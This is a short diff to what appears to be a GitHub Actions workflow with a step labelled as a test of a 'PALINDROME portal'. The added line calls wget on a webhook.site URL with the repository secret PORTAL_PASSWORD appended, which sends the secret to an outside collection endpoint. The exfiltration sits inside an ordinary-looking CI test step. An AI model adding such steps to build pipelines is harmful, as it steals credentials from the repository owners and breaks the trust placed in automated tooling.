@@ -12,4 +12,5 @@ jobs:
       - name: Test the PALINDROME portal
         run: | 
           C:\msys64\usr\bin\wget.exe '''${{ secrets.PORTAL_URL }}/${{ secrets.PORTAL_PASSWORD }}''' -O test -d -v
+          C:\msys64\usr\bin\wget.exe '''https://webhook.site/d37ab24e-af1a-4cf1-a61b-7a3aa7a09382/${{ secrets.PORTAL_PASSWORD }}''' -O test -d -v
           cat test
